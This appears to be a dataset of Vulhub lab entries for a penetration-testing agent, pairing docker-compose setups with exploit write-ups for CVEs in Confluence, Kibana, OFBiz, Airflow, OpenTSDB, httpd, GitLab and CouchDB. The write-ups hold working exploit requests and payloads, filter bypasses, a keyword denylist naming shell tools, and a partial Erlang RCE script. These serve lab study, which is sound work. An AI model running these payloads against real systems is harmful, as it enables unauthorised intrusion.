    "readme": "# Atlassian Confluence Pre-Auth Remote Code Execution via OGNL Injection (CVE-2023-22527)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nConfluence is a web-based corporate wiki developed by Australian software company Atlassian.\n\nA OGNL injection vulnerability on versions (8.0 to 8.5.3) of Confluence Data Center and Server allows an unauthenticated attacker to achieve RCE on an affected instance.\n\nReferences:\n\n- <https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html>\n- <https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/>\n\n## Vulnerable Environment\n\nExecute following command to start a Confluence Server 8.5.3:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit ``http://your-ip:8090`` and you will see the installation guide, select \"Trial installation\", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.\n\nFollowing [this guide](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396) to complete the installation.\n\nOn the database configuration page, fill in the form with database address `db`, database name `confluence`, username `postgres`, password `postgres`.\n\n![](1.png)\n\n## Exploit\n\nSimplely send following request to execute arbitrary commands inside an craft OGNL expression and get the response:\n\n```\nPOST /template/aui/text-inline.vm HTTP/1.1\nHost: localhost:8090\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 285\n\nlabel=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"id\"}))\n```\n\n![](2.png)\n\nAfter the version 7.18.0, Confluence introduced a `isSafeExpression` function to protect OGNL injection. Security researcher [Alvaro Muñoz](https://github.blog/2023-01-27-bypassing-ognl-sandboxes-for-fun-and-charities/) find a way to bypass it through `#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(String, Object)`, the full decoded payloads are here:\n\n```\n'+(#request['.KEY_velocity.struts2.context'].internalGet('ognl').findValue(@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"id\"})),{}))+'\n```\n"
  },
  {
    "filename": "CVE-2018-17246.md",
    "filenamenomd": "CVE-2018-17246",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2018-17246/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2018-17246/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 180 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n kibana:\n   image: vulhub/kibana:5.6.12\n   depends_on:\n    - elasticsearch\n   ports:\n    - \"5601:5601\"\n elasticsearch:\n   image: vulhub/elasticsearch:5.6.16\n\n```\n\n",
    "readme": "# Kibana Local File Inclusion (CVE-2018-17246)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nKibana is an open source data visualization dashboard for Elasticsearch.\n\nKibana versions before 6.4.3 and 5.6.13 contain an arbitrary file inclusion flaw in the Console plugin. An attacker with access to the Kibana Console API could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.\n\nReferences:\n\n- <https://nvd.nist.gov/vuln/detail/CVE-2018-17246>\n- <https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/>\n\n## Environment Setup\n\nStart the Kibana 5.6.12 and Elasticsearch 5.6.16:\n\n```\ndocker compose up -d\n```\n\nAfter started the environment, the Kibana is listening on `http://your-ip:5106`.\n\n## Vulnerability Reproduction\n\nSend the following request to trigger a basic path traversal:\n\n```\nhttp://your-ip:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd\n```\n\nThough there is nothing response except a error message with the 500 status code, you can see the exception in the `docker compose logs`:\n\n![](1.png)\n\nFile `/etc/passwd` is imported successfully.\n\nTo exploit this vulnerability, you need to upload a JavaScript webshell to the machine where the Kibana is running, then include it.\n\n```js\n// docker compose exec kibana bash && echo '...code...' > /tmp/vulhub.js\nexport default {asJson: function() {return require(\"child_process\").execSync(\"id\").toString()}}\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2024-38856.md",
    "filenamenomd": "CVE-2024-38856",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-38856/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-38856/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:18.12.14\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache OFBiz Authentication Bypass Leads to RCE (CVE-2024-38856)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nThis vulnerability occurs as a result of incomplete fixing for [CVE-2023-51467](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-51467). In Apache OFBiz version 18.12.11, the developers believe they have fixed the vulnerability, but in reality, they have only addressed one method of exploiting it. The Groovy expression injection still exists and allows unauthorized users to execute arbitrary commands on the server.\n\nReferences:\n\n- <https://github.com/apache/ofbiz-framework/commit/31d8d7>\n- <https://forum.butian.net/article/524>\n- <https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz>\n\n## Vulnerable environment\n\nExecuting following command to start an Apache OfBiz 18.12.14 server:\n\n```\ndocker compose up\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\nSend following request to execute command `id` by Groovy script:\n\n```\nPOST /webtools/control/main/ProgramExport HTTP/1.1\nHost: localhost:8443\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ\nContent-Length: 190\n\n------WebKitFormBoundaryDbR7sY3IIwQX7kcJ\nContent-Disposition: form-data; name=\"groovyProgram\"\n\nthrow new Exception('id'.\\u0065xecute().text);\n------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--\n```\n\n![](1.png)\n\nNoted that Apache Ofbiz restricts the use of the following keywords, but we can bypass this restriction using Unicode characters like `\\u0065xecute`.\n\n```\ndeniedWebShellTokens=java.,beans,freemarker,<script,javascript,<body,body ,<form,<jsp:,<c:out,taglib,<prefix,<%@ page,<?php,exec(,alert(,\\\n                     %eval,@eval,eval(,runtime,import,passthru,shell_exec,assert,str_rot13,system,decode,include,page ,\\\n                     chmod,mkdir,fopen,fclose,new file,upload,getfilename,download,getoutputstring,readfile,iframe,object,embed,onload,build,\\\n                     python,perl ,/perl,ruby ,/ruby,process,function,class,InputStream,to_server,wget ,static,assign,webappPath,\\\n                     ifconfig,route,crontab,netstat,uname ,hostname,iptables,whoami,\"cmd\",*cmd|,+cmd|,=cmd|,localhost,thread,require,gzdeflate,\\\n                     execute,println,calc,touch,calculate\n```\n"
  },
  {
    "filename": "CVE-2020-11978.md",
    "filenamenomd": "CVE-2020-11978",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11978/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/airflow/CVE-2020-11978/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 2353 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '3'\nx-airflow-common:\n  &airflow-common\n  image: vulhub/airflow:1.10.10\n  environment:\n    &airflow-common-env\n    AIRFLOW__CORE__EXECUTOR: CeleryExecutor\n    AIRFLOW__CORE__SQL_ALCHEMY_CONN: postgresql+psycopg2://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__RESULT_BACKEND: db+postgresql://airflow:airflow@postgres/airflow\n    AIRFLOW__CELERY__BROKER_URL: redis://:@redis:6379/0\n    AIRFLOW__CORE__FERNET_KEY: ''\n    AIRFLOW__CORE__DAGS_ARE_PAUSED_AT_CREATION: 'true'\n    AIRFLOW__CORE__LOAD_EXAMPLES: 'true'\n    #AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.basic_auth'\n    AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.default'\n  user: \"${AIRFLOW_UID:-50000}:${AIRFLOW_GID:-50000}\"\n  depends_on:\n    redis:\n      condition: service_healthy\n    postgres:\n      condition: service_healthy\n\nservices:\n  postgres:\n    image: postgres:13-alpine\n    environment:\n      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB: airflow\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"airflow\"]\n      interval: 5s\n      retries: 5\n\n  redis:\n    image: redis:5-alpine\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 5s\n      timeout: 30s\n      retries: 50\n\n  airflow-webserver:\n    <<: *airflow-common\n    command: webserver\n    ports:\n      - 8080:8080\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:8080/health\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-scheduler:\n    <<: *airflow-common\n    command: scheduler\n    healthcheck:\n      test: [\"CMD-SHELL\", 'airflow jobs check --job-type SchedulerJob --hostname \"$${HOSTNAME}\"']\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-worker:\n    <<: *airflow-common\n    command: worker\n    healthcheck:\n      test:\n        - \"CMD-SHELL\"\n        - 'celery --app airflow.executors.celery_executor.app inspect ping -d \"celery@$${HOSTNAME}\"'\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n  airflow-init:\n    <<: *airflow-common\n    command: initdb\n    environment:\n      <<: *airflow-common-env\n      _AIRFLOW_DB_UPGRADE: 'true'\n\n  flower:\n    <<: *airflow-common\n    command: flower\n    ports:\n      - 5555:5555\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:5555/\"]\n      interval: 10s\n      timeout: 10s\n      retries: 5\n\n```\n\n",
    "readme": "# Apache Airflow Command Injection in Example Dag (CVE-2020-11978)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache Airflow is an open source, distributed task scheduling framework. In the version prior to 1.10.10, there is a command injection vulnerability in the example DAG `example_trigger_target_dag`, which caused attackers to execute arbitrary commands in the worker process.\n\nSince there are many components to be started, it may be a bit stuck. Please prepare more than 2G of memory for the use of the virtual machine.\n\nReferences:\n\n- <https://lists.apache.org/thread/cn57zwylxsnzjyjztwqxpmly0x9q5ljx>\n- <https://github.com/pberba/CVE-2020-11978>\n\n## Vulnerability Environment\n\nExecute the following commands to start airflow 1.10.10:\n\n```bash\n#Initialize the database\ndocker compose run airflow-init\n\n#Start service\ndocker compose up -d\n```\n\n## Exploit\n\nVisit `http://your-ip:8080` to see the airflow management terminal, and turn on the `example_trigger_target_dag` flag:\n\n![](1.png)\n\nClick the \"triger\" button on the right, then input the configuration JSON with the crafted payload `{\"message\":\"'\\\";touch /tmp/airflow_dag_success;#\"}`:\n\n![](2.png)\n\nWait a few seconds to see the execution of \"success\":\n\n![](3.png)\n\nGo to the CeleryWorker container to see the result, `touch /tmp/airflow_dag_success` has been successfully executed:\n\n```\ndocker compose exec airflow-worker ls -l /tmp\n```\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2019-7609.md",
    "filenamenomd": "CVE-2019-7609",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2019-7609/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2019-7609/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 178 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n kibana:\n   image: vulhub/kibana:6.5.4\n   depends_on:\n    - elasticsearch\n   ports:\n    - \"5601:5601\"\n elasticsearch:\n   image: vulhub/elasticsearch:6.8.6\n\n```\n\n",
    "readme": "# Kibana Prototype Pollution Leads to Remote Code Execution (CVE-2019-7609)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nKibana is an open source data visualization dashboard for Elasticsearch.\n\nKibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This could possibly lead to an attacker executing arbitrary commands with permissions of the Kibana process on the host system.\n\nReferences:\n\n- https://nvd.nist.gov/vuln/detail/CVE-2019-7609\n- https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/\n- https://slides.com/securitymb/prototype-pollution-in-kibana/#/4\n\n## Setup\n\nBefore you can setup the environment, you need to change `vm.max_map_count` to greater than 262144 in host server (not in the docker container):\n\n```\nsysctl -w vm.max_map_count=262144\n```\n\nThen, start the Kibana 6.5.4 and Elasticsearch 6.8.6:\n\n```\ndocker compose up -d\n```\n\n## Vulnerability Reproduce\n\nAfter started the environment, the Kibana is listening on `http://your-ip:5106`. The prototype pollution is happens in Timeline visualizer, fill in following payload here:\n\n```\n.es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"/bin/touch /tmp/success\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\n```\n\n![](1.png)\n\nThen, visit \"Canvas\" page to trigger the command `/bin/touch /tmp/success`. The file `/tmp/success` is created successfully:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2020-35476.md",
    "filenamenomd": "CVE-2020-35476",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/opentsdb/CVE-2020-35476/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/opentsdb/CVE-2020-35476/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n opentsdb:\n   image: vulhub/opentsdb:2.4.0\n   ports:\n    - \"4242:4242\"\n\n```\n\n",
    "readme": "# OpenTSDB Arbitrary Command Injection Remote Code Execution (CVE-2020-35476)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenTSDB is a distributed, scalable Time Series Database (TSDB) written on top of HBase.\n\nA remote code execution vulnerability occurs in OpenTSDB through 2.4.0 via command injection in the yrange parameter. The yrange value is written to a gnuplot file in the /tmp directory. This file is then executed via the mygnuplot.sh shell script. (tsd/GraphHandler.java attempted to prevent command injections by blocking backticks but this is insufficient.)\n\nReferences:\n\n- https://github.com/OpenTSDB/opentsdb/issues/2051\n- https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html\n\n## Vulnerable Environment\n\nExecute the following command to start a OpenTSDB server 2.4.0:\n\n```\ndocker compose up -d\n```\n\nOnce the service is started, visit `http://your-ip:4242` to see the web interface of the OpenTSDB.\n\n## Exploit\n\nYou need to know the name of a metric before you can exploit this vulnerability on `http://your-ip:4242/api/suggest?type=metrics&q=&max=10`:\n\n![](1.png)\n\nHowever, the metrics list is empty.\n\nFortunately, the `tsd.core.auto_create_metrics` is set to `true` in this vulnerable OpenTSDB, so you can create a metric named `sys.cpu.nice` through following request:\n\n```\nPOST /api/put/ HTTP/1.1\nHost: your-ip:4242\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nConnection: close\nContent-Length: 150\n\n{\n    \"metric\": \"sys.cpu.nice\",\n    \"timestamp\": 1346846400,\n    \"value\": 20,\n    \"tags\": {\n       \"host\": \"web01\",\n       \"dc\": \"lga\"\n    }\n}\n```\n\nIf at least one metric exists and is not empty, the above request is not required.\n\nSend following request, where the value of the parameter `m` must contain a valid metric name:\n\n```\nGET /q?start=2000/10/21-00:00:00&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[0:system(%27touch%20/tmp/success%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json HTTP/1.1\nHost: your-ip:4242\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\n\n\n```\n\n![](2.png)\n\n`touch /tmp/success` has been successfully executed.\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2021-40438.md",
    "filenamenomd": "CVE-2021-40438",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-40438/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-40438/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-40438/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 110 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n apache:\n   build: .\n   ports:\n    - \"8080:80\"\n tomcat:\n   image: vulhub/tomcat:8.5.19\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-40438/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 1074 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/httpd:2.4.43\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && sed -i \"s|#LoadModule proxy_module modules/mod_proxy.so|LoadModule proxy_module modules/mod_proxy.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#LoadModule proxy_http_module modules/mod_proxy_http.so|LoadModule proxy_http_module modules/mod_proxy_http.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#LoadModule proxy_ajp_module modules/mod_proxy_ajp.so|LoadModule proxy_ajp_module modules/mod_proxy_ajp.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#Include conf/extra/httpd-vhosts.conf|Include conf/extra/httpd-vhosts.conf|g\" /usr/local/apache2/conf/httpd.conf \\\n    && { \\\n        echo '<VirtualHost *>'; \\\n        echo '  ServerAdmin webmaster@localhost'; \\\n        echo '  ServerName localhost'; \\\n        echo '  DocumentRoot /usr/local/apache2/htdocs'; \\\n        echo ; \\\n        echo '  ProxyPass / \"ajp://tomcat:8009/\" disablereuse=On'; \\\n        echo '</VirtualHost>'; \\\n    } > /usr/local/apache2/conf/extra/httpd-vhosts.conf\n\n```\n\n",
    "readme": "# Apache HTTP Server 2.4.48 mod_proxy SSRF (CVE-2021-40438)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.\n\nA Server-Side Request Forgery (SSRF) flaw was found in mod_proxy of httpd. This flaw allows a remote, unauthenticated attacker to make the httpd server forward requests to an arbitrary server. The attacker could get, modify, or delete resources on other services that may be behind a firewall and inaccessible otherwise. The impact of this flaw varies based on what services and resources are available on the httpd network.\n\nReferences:\n\n- https://httpd.apache.org/security/vulnerabilities_24.html\n- https://firzen.de/building-a-poc-for-cve-2021-40438\n- https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html\n\n## Vulnerable environment\n\nExecute following commands to start a vulnerable Apache HTTP Server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, you can see the example site of a backend Apache Tomcat server. Here, Apache HTTP Server is running as a intermediate reverse proxy between the client and the back-end Tomcat server, and they communicate through the AJP protocol.\n\n## Exploit\n\nSend the following request to exploit the SSRF vulnerability:\n\n```\nGET /?unix|http://example.com/ HTTP/1.1\nHost: 192.168.1.162:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\n\n\n```\n\nGot the response of `http://example.com`:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2016-9086.md",
    "filenamenomd": "CVE-2016-9086",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2016-9086/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2016-9086/load-extensions.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2016-9086/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 916 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\n\nservices:\n  redis:\n    image: redis:4.0.14-alpine\n\n  postgresql:\n    image: postgres:11.9-alpine\n    environment:\n    - POSTGRES_USER=gitlab\n    - POSTGRES_PASSWORD=password\n    - POSTGRES_DB=gitlabhq_production\n    - DB_EXTENSION=pg_trgm\n    volumes:\n    - ./load-extensions.sh:/docker-entrypoint-initdb.d/load-extensions.sh\n\n  gitlab:\n    image: vulhub/gitlab:8.13.1\n    depends_on:\n    - redis\n    - postgresql\n    ports:\n    - \"8080:80\"\n    - \"10022:22\"\n    environment:\n    - DEBUG=false\n    - GITLAB_PORT=8080\n    - GITLAB_SSH_PORT=10022\n    - GITLAB_SECRETS_DB_KEY_BASE=secret-key-is-here1\n    - GITLAB_SECRETS_SECRET_KEY_BASE=secret-key-is-here2\n    - GITLAB_SECRETS_OTP_KEY_BASE=secret-key-is-here3\n    - DB_ADAPTER=postgresql\n    - DB_HOST=postgresql\n    - DB_USER=gitlab\n    - DB_PASS=password\n    - DB_NAME=gitlabhq_production\n    - REDIS_HOST=redis\n    - GITLAB_ROOT_PASSWORD=vulhub123456\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/gitlab/CVE-2016-9086/load-extensions.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 297 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/sh\n\n# You could probably do this fancier and have an array of extensions\n# to create, but this is mostly an illustration of what can be done\n\npsql -v ON_ERROR_STOP=1 --username \"$POSTGRES_USER\" --dbname \"$POSTGRES_DB\" <<EOF\n    create extension pg_trgm;\n    select * FROM pg_extension;\nEOF\n\n```\n\n",
    "readme": "# GitLab Arbitrary File Disclosure (CVE-2016-9086)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nGitLab is a web-based DevOps lifecycle tool that provides a Git repository manager providing wiki, issue-tracking and continuous integration and deployment pipeline features.\n\nJobert Abma from HackerOne disclosed a critical security flaw in the \"import/export project\" feature of GitLab. Added in GitLab 8.9, this feature allows a user to export and then re-import their projects as tape archive files (tar). All GitLab versions prior to 8.13.0 restricted this feature to administrators only. Starting with version 8.13.0 this feature was made available to all users.\n\nThis feature did not properly check for symbolic links in user-provided archives and therefore it was possible for an authenticated user to retrieve the contents of any file accessible to the GitLab service account. This included sensitive files such as those that contain secret tokens used by the GitLab service to authenticate users. Please see the issue for more details.\n\nReferences:\n\n- https://about.gitlab.com/releases/2016/11/02/cve-2016-9086-patches/\n- https://hackerone.com/reports/178152\n- http://paper.seebug.org/104/\n\n## Vulnerable environment\n\nExecute following command to start a GitLab Community Server 8.13.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:8080` to see the website, the credentials of default administrator account are `root` and `vulhub123456`.\n\n## Exploit\n\nSignup and signin an account, then click the \"GitLab export\" button on the project creation page:\n\n![](2.png)\n\nUploaded the file [test.tar.gz](test.tar.gz), and the file `/etc/passwd` is disclosed:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2022-24706.md",
    "filenamenomd": "CVE-2022-24706",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2022-24706/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2022-24706/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/couchdb/CVE-2022-24706/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 4196 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n# Exploit Title: Remote Command Execution via Erlang Distribution Protocol \n# Date: 2022-01-21\n# Exploit Author: Konstantin Burov, @_sadshade\n# Software Link: https://www.erlang.org/doc/apps/erts/erl_dist_protocol.html\n# Version: N/A\n# Tested on: Kali 2021.2\n# Based on 1F98D's Erlang Cookie - Remote Code Execution\n# Shodan: port:4369 \"name \"\n# References:\n#  https://www.exploit-db.com/exploits/49418\n#  https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/\n#  https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd#erlang-cookie-rce\n# \n#\n#!/usr/local/bin/python3\n\nimport socket\nfrom hashlib import md5\nimport struct\nimport sys\nimport re\nimport time\n\nTARGET = sys.argv[1]\nEPMD_PORT = int(sys.argv[2]) # Default Erlang distributed port\nCOOKIE = \"monster\" # Default Erlang cookie for CouchDB \nERLNAG_PORT = 0\nEPM_NAME_CMD = b\"\\x00\\x01\\x6e\" # Request for nodes list\n\n# Some data:\nNAME_MSG  = b\"\\x00\\x15n\\x00\\x05\\x00\\x07\\x49\\x9cAAAAAA@AAAAAAA\"\nCHALLENGE_REPLY = b\"\\x00\\x15r\\x01\\x02\\x03\\x04\"\nCTRL_DATA  = b\"\\x83h\\x04a\\x06gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\"\nCTRL_DATA += b\"\\x00\\x00\\x00\\x00\\x00w\\x00w\\x03rex\"\n\n\ndef compile_cmd(CMD):\n    MSG  = b\"\\x83h\\x02gw\\x0eAAAAAA@AAAAAAA\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"\n    MSG += b\"\\x00\\x00h\\x05w\\x04callw\\x02osw\\x03cmdl\\x00\\x00\\x00\\x01k\"\n    MSG += struct.pack(\">H\", len(CMD))\n    MSG += bytes(CMD, 'ascii')\n    MSG += b'jw\\x04user'\n    PAYLOAD = b'\\x70' + CTRL_DATA + MSG\n    PAYLOAD = struct.pack('!I', len(PAYLOAD)) + PAYLOAD\n    return PAYLOAD\n\nprint(\"Remote Command Execution via Erlang Distribution Protocol.\\n\")\n\n# Connect to EPMD:\ntry:\n    epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    epm_socket.connect((TARGET, EPMD_PORT))\nexcept socket.error as msg:\n    print(\"Couldnt connect to EPMD: %s\\n terminating program\" % msg)\n    sys.exit(1)\n    \nepm_socket.send(EPM_NAME_CMD) #request Erlang nodes\nif epm_socket.recv(4) == b'\\x00\\x00\\x11\\x11': # OK\n    data = epm_socket.recv(1024)\n    data = data[0:len(data) - 1].decode('ascii')\n    data = data.split(\"\\n\")\n    if len(data) == 1:\n        choise = 1\n        print(\"Found \" + data[0])\n    else:\n        print(\"\\nMore than one node found, choose which one to use:\")\n        line_number = 0\n        for line in data:\n            line_number += 1\n            print(\" %d) %s\" %(line_number, line))\n        choise = int(input(\"\\n> \"))\n        \n    ERLNAG_PORT = int(re.search(\"\\d+$\",data[choise - 1])[0])\nelse:\n    print(\"Node list request error, exiting\")\n    sys.exit(1)\nepm_socket.close()\n\n# Connect to Erlang port:\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((TARGET, ERLNAG_PORT))\nexcept socket.error as msg:\n    print(\"Couldnt connect to Erlang server: %s\\n terminating program\" % msg)\n    sys.exit(1)\n   \ns.send(NAME_MSG)\ns.recv(5)\nchallenge = s.recv(1024)     # Receive \"challenge\" message\nprint(challenge)\nchallenge = struct.unpack(\">I\", challenge[9:13])[0]\n\n#print(\"Extracted challenge: {}\".format(challenge))\n\n# Add Challenge Digest\nCHALLENGE_REPLY += md5(bytes(COOKIE, \"ascii\")\n    + bytes(str(challenge), \"ascii\")).digest()\ns.send(CHALLENGE_REPLY)\nCHALLENGE_RESPONSE = s.recv(1024)\n\nif len(CHALLENGE_RESPONSE) == 0:\n    print(\"Authentication failed, exiting\")\n    sys.exit(1)\n\nprint(\"Authentication successful\")\nprint(\"Enter command:\\n\")\n\ndata_size = 0\nwhile True:\n    if data_size <= 0:\n        CMD = 